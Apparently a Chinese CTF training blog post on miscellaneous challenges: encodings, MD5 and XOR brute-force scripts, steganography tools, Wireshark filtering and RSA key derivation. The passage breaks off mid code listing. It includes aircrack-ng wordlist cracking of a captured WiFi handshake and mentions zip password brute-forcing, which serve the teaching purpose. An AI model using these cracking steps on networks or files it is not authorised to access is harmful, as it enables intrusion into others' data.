title="day01–Danie1"></a>day01–Danie1</h2><hr><p>MISC(Miscellaneous)类型，即安全杂项，题目或涉及流量分析、电子取证、人肉搜索、数据分析等等。</p><p>例题<code>day01.zip</code>下载网盘<a href="https://pan.baidu.com/s/1P_dQTLxLwdA1anIGdgWqZw" rel="external nofollow" target="_blank">链接</a> 提取码: fjru</p><h3 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h3><hr><h4 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h4><ul><li>例：  ..-. .-.. .- –. .—- ..— …– ….- ….. -…. </li><li><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" rel="external nofollow" target="_blank">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></li></ul><h4 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h4><ul><li><p>它是一种替换加密的技术，<a href="https://baike.baidu.com/item/%E6%98%8E%E6%96%87" rel="external nofollow" target="_blank">明文</a>中的所有字母都在<a href="https://baike.baidu.com/item/%E5%AD%97%E6%AF%8D%E8%A1%A8" rel="external nofollow" target="_blank">字母表</a>上向后（或向前）按照一个固定数目进行偏移后被替换成<a href="https://baike.baidu.com/item/%E5%AF%86%E6%96%87" rel="external nofollow" target="_blank">密文</a>。</p></li><li><p>例： iodj{dvgi}</p></li><li><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php" rel="external nofollow" target="_blank">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></li></ul><h4 id="base编码"><a href="#base编码" class="headerlink" title="base编码"></a>base编码</h4><ul><li><p>base16:</p><p>Base16编码就是将ASCII字符集中可打印的字符(数字0~9和字母A~F)对应的二进制字节数据进行编码</p></li><li><p>编码的方式: 根据ASCII编码得到对应的二进制,将所有二进制串起来,然后按4个二进制位分割,转化成十进制数值,根据Base16编码表得到编码</p></li><li><p>例将”ILU”字符串加密</p></li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080501.png" alt=""></p></li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080502.png" alt=""></p></li></ul><ul><li><p>base32:</p><p>与Base16编码区别的是,Base32使用了ASCII编码中可打印的32个字符(大写字母A~Z和数字2~7)对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组,由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位,则在编码后数据补充”=”</p></li><li><p>编码方式：先根据ASCII编码得到对应字符编码值以及对应二进制,将所有二进制串起来,然后按照5个二进制位为一组分割 ,得到十进制值=&gt;找到Base32编码表找到对应的字符.案例总共分割成了5组(25位),还差三组(15位).在末尾补充3个”=”.</p></li><li>例将”ILU”字符串加密</li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/20190080503.png" alt=""></p></li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080504.png" alt=""></p></li></ul><ul><li><p>base64:</p><p>Base64编码使用了ASCII编码中64个可打印的字符(大写字母A~Z,小写字母a~z,数字0~9以及”+”,”/“)将任意字节数据进行编码.Base64编码将串起来的二进制以6位进行分割.所以分切之前的二进制位数应该是24的倍数(即6,8的最小公倍数).如果不足24位,则在编码后数据后面添加”=”</p></li><li><p>编码方式：先根据ASCII编码得到对应字符编码值以及对应二进制，将串起来的二进制按6位分为一组.得到4组(24位).所以末尾不用补充”=”</p></li><li>例将”ILU”字符串加密</li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080505.png" alt=""></p></li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080506.png" alt=""></p></li></ul><ul><li><p>题目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MzQ0MTM1MzYzNDQ1MzQzNjM0NDYzNTMyMzMzMjM0MzQzNDQzMzQzOTM1NDEzNTM0MzQzNzM1MzQzNDQyMzQzNzM0NDMzNDQxMzQ0MzM1MzUzNTMzMzUzNzM1MzMzNTM1MzQ0MTM0MzIzNDM4MzQzNTM0MzUzNDQ1MzUzMzM1MzIzNDM4MzUzNTMzMzYzNTM0MzMzMjM1MzAzNDM5MzM0NA==</span><br><span class="line"></span><br><span class="line">flag格式：flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bs</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        ok = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s1 = base64.b64decode(s).decode(<span class="string">'ascii'</span>)</span><br><span class="line">            ok = <span class="number">1</span></span><br><span class="line">            s=s1</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s2 = base64.b32decode(s).decode(<span class="string">'ascii'</span>)</span><br><span class="line">            ok = <span class="number">1</span></span><br><span class="line">            s=s2</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s3 = base64.b16decode(s).decode(<span class="string">'ascii'</span>)</span><br><span class="line">            ok = <span class="number">1</span></span><br><span class="line">            s=s3</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ok == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span>  s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    s = raw_input(<span class="string">"请输入字符串:"</span>)</span><br><span class="line">    res = bs(s)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---------------------------'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'result:'</span>+ res</span><br></pre></td></tr></table></figure></li></ul><h3 id="ascii编码"><a href="#ascii编码" class="headerlink" title="ascii编码"></a>ascii编码</h3><ul><li><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080508.png" alt=""></li></ul><h3 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h3><p>  例：<code>&amp;#102;&amp;#108;&amp;#97;&amp;#103;</code></p><ul><li><a href="http://tool.chinaz.com/tools/unicode.aspx" rel="external nofollow" target="_blank">http://tool.chinaz.com/tools/unicode.aspx</a></li></ul><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><ul><li><p>MD5即Message-Digest Algorithm 5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一</p></li><li><p>加密</p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080509.png" alt=""></p></li><li><p>解密：<a href="https://www.cmd5.com/" rel="external nofollow" target="_blank">https://www.cmd5.com/</a></p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080510.png" alt=""></p></li></ul><ul><li><p>题目1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(?)[:6] == &apos;233333&apos;</span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000000</span>):</span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(str(i).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">res = m.hexdigest()</span><br><span class="line"><span class="keyword">if</span> res[:<span class="number">6</span>] == <span class="string">'233333'</span>:</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></li><li><p>题目2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已知一段由5个大写字母组成的明文字符串，经过md5加密后的密文前6位为73acd9,求加密前的明文</span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> letter:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> letter:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> letter:</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">                    cipher = i+j+k+l+n</span><br><span class="line">                    m = hashlib.md5()</span><br><span class="line">                    m.update(cipher)</span><br><span class="line">                    res = m.hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> res[:<span class="number">6</span>] == <span class="string">'73acd9'</span>:</span><br><span class="line">                        <span class="keyword">print</span> res</span><br><span class="line">                        <span class="keyword">print</span> cipher</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><ul><li><p>相同为0，不同为1</p></li><li><p>题目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文 : FR8SFAgwJzUWASwLHAEsAA4=</span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python  </span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-  </span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">ming = <span class="string">'FR8SFAgwJzUWASwLHAEsAA4='</span></span><br><span class="line">mi=base64.b64decode(ming)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(mi)):</span><br><span class="line">t=ord(mi[i])^j</span><br><span class="line">flag+=chr(t)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> flag :</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h3><hr><p>图片隐写主要考察信息在图片中隐写的几种方法，文件头信息修改，stegsolve工具使用，LSB算法，binwalk工具使用等知识。</p><h4 id="常用工具介绍（常用工具下载地址：https-www-ctftools-com-down-）"><a href="#常用工具介绍（常用工具下载地址：https-www-ctftools-com-down-）" class="headerlink" title="常用工具介绍（常用工具下载地址：https://www.ctftools.com/down/）"></a>常用工具介绍（常用工具下载地址：<a href="https://www.ctftools.com/down/）" rel="external nofollow" target="_blank">https://www.ctftools.com/down/）</a></h4><ul><li><p>binwalk：是一个固件分析工具，多用于逆向工程、取证、隐写分析</p></li><li><p>winhex：是在Windows下执行的十六进制编辑软件，此软件功能强大，有完好的分区管理功能和文件管理功能，在CTF中一般用来查看文件头格式、修改16进制数据等。</p></li><li><p>Stegsolve：是一款图片分析工具，功能十分强大</p></li><li><p>Stegdetect：是一种数字图像隐写分析工具，主要实现JPEG图像的隐秘信息的嵌入的检测</p></li><li><p>foremost：和binwalk结合使用，提取隐藏信息。</p></li><li><p>MP3stego：音频隐写工具 （链接：<a href="https://pan.baidu.com/s/1fSSX-e-Q95GY0bftght3Pg" rel="external nofollow" target="_blank">https://pan.baidu.com/s/1fSSX-e-Q95GY0bftght3Pg</a><br>提取码：0r3r ）<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p><ul><li><p>用法：隐藏信息  encode -E hidden_text.txt -P pass svega.wav stego.mp3</p><p>提取信息 decode -X -P pass svega_stego.mp3</p></li></ul></li><li><p><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865" rel="external nofollow" target="_blank">常见文件文件头格式</a></p></li><li><p>题目</p><ol><li><p>查看属性 meinv.jpg  （易）</p></li><li><p>查看图片内容   hacker.jpg   （易）</p></li><li><p>binwalk + mp3stego   3.jpg  （中）</p></li><li><p>binwalk + 伪加密 carefully.jpg （中）  （ps：伪加密是在未加密的zip文件基础上修改了它的压缩源文件目录区里的全局方式位标记的比特值，使得压缩软件打开它的时候识别为加密文件，提示输入密码， 而在这个时候，不管你用什么软件对其进行密码破解，都无法打开它） </p><p>伪加密（<a href="https://blog.csdn.net/qq_26187985/article/details/83654197）" rel="external nofollow" target="_blank">https://blog.csdn.net/qq_26187985/article/details/83654197）</a></p><p>将如图位置的09改为00即可，或者使用工具ZipCenOp.jar (用法 java -jar ZipCenOp.jar r xxx.zip)</p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080507.png" alt=""></p></li><li><p>gif帧   flag.png.gif    (易)</p></li><li><p>压缩包爆破   love.zip   （中）</p></li><li><p>LSB隐写 tanwanlanyue   （中）</p></li><li><p>其他  f1ag.png   (中)</p></li><li><p>png改高度    dabai.png   (中) </p><p>ps:png文件格式简介：</p><p>89 50 4E 47 是文件的格式</p><p>00 00 00 0D说明IHDR头块长为13</p><p>49 48 44 52 IHDR标识</p><p>00 00 01 F4  图像的宽</p><p>00 00 01 A4 图像的高</p></li></ol></li></ul><h3 id="lsb隐写"><a href="#lsb隐写" class="headerlink" title="lsb隐写"></a>lsb隐写</h3><hr><p>首先来讲png图片，png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，我们修改的信息就可能会在压缩的过程中被破坏。而png图片虽然也有压缩，但却是无损压缩，这样我们修改的信息也就能得到正确的表达，不至于丢失。BMP的图片也是一样的，是没有经过压缩的。BMP图片一般是特别的大的，因为BMP把所有的像数都按原样储存，没有进行压缩。<br>png图片中的图像像数一般是由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色，即16777216种颜色。而人类的眼睛可以区分约1000万种不同的颜色，这就意味着人类的眼睛无法区分余下的颜色大约有6777216种。<br>    LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB），而人类的眼睛不会注意到这前后的变化，每个像数可以携带3比特的信息。</p><h2 id="day02–7iny"><a href="#day02–7iny" class="headerlink" title="day02–7iny"></a>day02–7iny</h2><h3 id="内容简介："><a href="#内容简介：" class="headerlink" title="内容简介："></a>内容简介：</h3><p>day02以流量分析，加密解密为主。例题<code>day02.zip</code>下载网盘<a href="https://pan.baidu.com/s/1P_dQTLxLwdA1anIGdgWqZw" rel="external nofollow" target="_blank">链接</a> 提取码: fjru</p><h3 id="Wireshark："><a href="#Wireshark：" class="headerlink" title="Wireshark："></a>Wireshark：</h3><p>Wireshark是目前全球使用最广泛的开源抓包软件（前身为Etherea1），是一个通用化的网络数据嗅探器和协议分析器，由Gerald Combs编写并于1998年以GPL开源许可证发布。</p><h3 id="推荐资料："><a href="#推荐资料：" class="headerlink" title="推荐资料："></a>推荐资料：</h3><p>《Wireshark数据包分析实战》第二版Chris Sanders<br>《Wireshark网络分析》第二版Laura Chappe11<br>《TCP/IP协议栈详解卷一》W.Richard Stevens</p><h3 id="相关站点："><a href="#相关站点：" class="headerlink" title="相关站点："></a>相关站点：</h3><p>官网下载<a href="https://www.wireshark.org/#download" rel="external nofollow" target="_blank">地址</a></p><p>官方<a href="https://wiki.wireshark.org/" rel="external nofollow" target="_blank">wiki页面</a></p><h3 id="流量分析："><a href="#流量分析：" class="headerlink" title="流量分析："></a>流量分析：</h3><p><strong>流量分析有以下三个方向：</strong><br>1、流量包修复<br>2、协议分析<br>3、数据提取<br><strong>转载</strong>来自<code>Yokeen总结</code></p><h4 id="1、流量包修复"><a href="#1、流量包修复" class="headerlink" title="1、流量包修复"></a>1、流量包修复</h4><p>通常都借助现成的工具例如PCAPFIX直接修复</p><ul><li><p><a href="https://f00l.de/hacking/pcapfix.php" rel="external nofollow" target="_blank">在线PCAPFIX</a></p></li><li><p>PCAPFIX<a href="https://github.com/Rup0rt/pcapfix/tree/devel" rel="external nofollow" target="_blank">下载</a><br>流量包常见的块，详细介绍可以看：<a href="http://www.tcpdump.org/pcap/pcap.html" rel="external nofollow" target="_blank">http://www.tcpdump.org/pcap/pcap.html</a></p></li></ul><h4 id="2、协议分析"><a href="#2、协议分析" class="headerlink" title="2、协议分析"></a>2、协议分析</h4><p>须掌握wireshark过滤器（捕捉过滤器与显示过滤器）的基础语法，从而更快更精准的获取指定的信息。<br><code>捕捉过滤器</code>：用于决定将什么样的信息记录在捕捉结果中，需要在开始捕捉前设置。<br><code>显示过滤器</code>：用于在捕获结果中进行详细查找，可以在得到捕捉结果后进行更改<br>捕捉过滤器基础语法<br>Protocol Direction Host(s) Value LogicalOperations other expression<br>tcp dst 10.1.1.1 80 and tcp dst 10.2.2.2 3128</p><p>Protocol<br>可能的值: ether, fddi, ip, arp, rarp, decnet,lat, sca, moprc, mopdl, tcp and udp，如果没有特别指明是什么协议，则默认使用所有支持的协议。<br>Direction<br>可能的值: src, dst, src and dst, src or dst，如果没有特别指明来源或目的地，则默认使用 “src or dst” 作为关键字。<br>Host(s)<br>可能的值： net, port,host, portrange，如果没有指定此值，则默认使用”host”关键字。<br>例如，”src 10.1.1.1”与”src host 10.1.1.1”相同。<br>Logical Operations<br>可能的值：not, and, or<br>否(“not”)具有最高的优先级，或(“or”)和与(“and”)具有相同的优先级<br>“not tcp port 3128 and tcp port23”与”(not tcp port 3128) and tcp port23”相同。</p><p>举例分析：<br>tcp dst port 3128 //目的TCP端口为3128的封包。<br>ip src host 10.1.1.1 //来源IP地址为10.1.1.1的封包。<br>host 10.1.2.3 //目的或来源IP地址为10.1.2.3的封包。<br>src portrange 2000-2500<br>//来源为UDP或TCP，并且端口号在2000至2500范围内的封包<br>not icmp //除了icmp以外的所有封包。</p><p>显示过滤器基础语法<br>Protocol String1 String2 ComparisonOperator Value Logical Operations other expression<br>Protocol<br>可以使用大量位于OSI模型第2至7层的协议。在Expression中可以看到，例如，IP，TCP，DNS，SSH<br>String1，String2<br>可选择显示过滤器右侧表达式，点击父类的+号，然后查看其子类<br>Comparison Oerators<br>可以使用六种比较运算符<br>英文写法：|c语言写法：|含义：<br>-|-|-<br>eq|==|等于|<br>ne|!=|不等于|<br>gt|&gt;|大于|<br>It|&lt;|小于|<br>ge|&gt;=|大于等于|<br>le|&lt;=|小于等于|</p><p>Logical Expressions<br>英文写法：|c语言写法：|含义：<br>-|-|-<br>and|&amp;&amp;|逻辑与<br>or| <code>||</code>|逻辑或<br>xor| <code>^^</code>|逻辑异或<br>not| !|逻辑非</p><p>举例分析：<br>snmp || dns || icmp //显示SNMP或DNS或ICMP封包<br>ip.addr == 10.1.1.1 //显示源或目的IP为10.1.1.1的封包<br>ip.src != 10.1.2.3 and ip.dst!=10.4.5.6 //显示源不为10.1.2.3并且目的不为10.4.5.6的封包<br>tcp.port == 25 //显示来源或目的TCP端口号为25的封包<br>tcp.dport == 25 //显示目的TCP端口号为25的封包</p><p>如果过滤器语法是正确的，表达式背景为<code>绿色</code>，否则为<code>红色</code><br>前文中的wireshark文件还原就可以说是一个很基础的数据包流量分析。</p><h4 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h4><p>这一块是流量包中另一个重点，通过对协议分析，找到题目的关键点，从而对所需要的数据进行提取。</p><p>可以学习一下tshark的使用<br>tshark作为wireshark的命令行版，高效快捷是它的优点，配合其余命令行工具(awk,grep)等灵活使用，可以快速定位，提取数据从而省去了繁杂的脚本编写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常用方法：tshark -r *.pcap -Y ** -T fields -e **|***&gt;data</span><br></pre></td></tr></table></figure><h4 id="题目1、MISC-rar"><a href="#题目1、MISC-rar" class="headerlink" title="题目1、MISC.rar"></a>题目1、MISC.rar</h4><blockquote><p>key为文本格式，你找得到吗？</p></blockquote><p>用wireshark打开数据包，在文件 -&gt; 导出对象中，选择HTTP-&gt;保存txt文件</p><h4 id="题目2、A记录（蓝鲸）"><a href="#题目2、A记录（蓝鲸）" class="headerlink" title="题目2、A记录（蓝鲸）"></a>题目2、A记录（蓝鲸）</h4><blockquote><p>他在看什么视频，好像很好看，不知道是什么网站的。 还好我截取了他的数据包，找呀找。 key就是网站名称。格式ctf{key} tip:A记录的第一条。所以答案是</p></blockquote><p>ps:在数据包分析工具中，看到的都是加密后的802.11协议的数据包，而无法看到数据包的原始内容。为了方便分析，aircrack-ng工具包提供了一个专用解密工具airdecap-ng。<strong>kali自带</strong></p><p>1.aircrack-ng shipin.cap -w password.txt<br>2.airdecap-ng shipin.cap -e 0719 -p 88888888<br>3.top1000弱口令<a href="https://www.yesck.com/down/TOP1000password.txt" rel="external nofollow" target="_blank">下载</a></p><h4 id="题目3、好多苍蝇【蓝鲸】"><a href="#题目3、好多苍蝇【蓝鲸】" class="headerlink" title="题目3、好多苍蝇【蓝鲸】"></a>题目3、好多苍蝇【蓝鲸】</h4><blockquote><p>好多苍蝇啊，吧我的重要文件都爬满了，看不到怎么办？提交格式是flag{xxxx},所以答案是？</p></blockquote><ul><li>738数据包，导出application/octet-stream的数据流，删除(00000160,B)之前的都是不需要的数据，拼接数据。伪加密，foremost分离。<br>Tools：<br>hxD:<a href="https://mh-nexus.de/en/downloads.php?product=HxD20" rel="external nofollow" target="_blank">下载</a><br>类似软件，了解不推荐<br>winhex:<a href="http://www.x-ways.net/winhex/" rel="external nofollow" target="_blank">下载</a><br>Notepad++ 16进制编辑功能:<a href="https://sourceforge.net/projects/npp-plugins/files/Hex%20Editor/" rel="external nofollow" target="_blank">下载UNI</a><br>解压缩后把HexEditor.dll文件复制到安装目录（如Notepad++\plugins），退出需要以十六进制显示时，点击菜单的：【插件】－【Hex-Editor】－【View in Hex】即可。</li></ul><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章:"></a>参考文章:</h3><p>1.某大佬给新疆电网培训<a href="[https://www.addon.pub/2018/04/10/CTF%E4%B8%AD%E7%9A%84%E6%9D%82%E9%A1%B9%E5%B0%8F%E7%BB%93/](https://www.addon.pub/2018/04/10/CTF中的杂项小结/">MISC总结</a>)</p><p>2.流量分析–<a href="https://skysec.top/2018/04/21/流量分析-CTF题目实战" rel="external nofollow" target="_blank">ctf实战</a></p><p>3.流量分析–<a href="https://xz.aliyun.com/t/1960" rel="external nofollow" target="_blank">HTTP认识</a></p><p>4.蓝鲸安全CTF打卡第一期杂项篇<a href="https://www.jianshu.com/p/84a65b64c742" rel="external nofollow" target="_blank">WriteUp</a></p><p>5.蓝鲸安全30day打卡<a href="http://codeqi.top/2018/02/06/30-Days/" rel="external nofollow" target="_blank">Writeup</a></p><h3 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h3><h4 id="RSA学习"><a href="#RSA学习" class="headerlink" title="RSA学习"></a>RSA学习</h4><p>从0到1，<a href="http://since1994.cn/?p=164" rel="external nofollow" target="_blank">基础知识</a></p><h4 id="RSA出题"><a href="#RSA出题" class="headerlink" title="RSA出题"></a>RSA出题</h4><p>参考<a href="https://0verwatch.top/RSA-SimpleLearn.html" rel="external nofollow" target="_blank">博客</a></p><h4 id="题目1：密钥生成"><a href="#题目1：密钥生成" class="headerlink" title="题目1：密钥生成"></a>题目1：密钥生成</h4><blockquote><p>在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出d,格式：key{xxxx}</p></blockquote><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080619.jpg" alt=""></p><ul><li><p>已知p q e 解d <a href="http://since1994.cn/?p=166" rel="external nofollow" target="_blank">详细讲解</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ed ≡ 1 (mod r)</span><br><span class="line">r = (p-1)(q-1) = 2135733082216268400</span><br><span class="line">ed mod r = 1 mod r</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">r=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span>-r*i)%e == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'d:'</span> + <span class="string">'%d'</span> % ((<span class="number">1</span>-r*i)/e))</span><br></pre></td></tr></table></figure><p>使用rsatool.py进行计算，环境kali,python2.X</p><blockquote><p>sudo apt-get install libgmp-dev</p><p>pip install gmpy</p></blockquote><p>python2 rsatool.py -p 473398607161 -q 4511491 -e 17</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 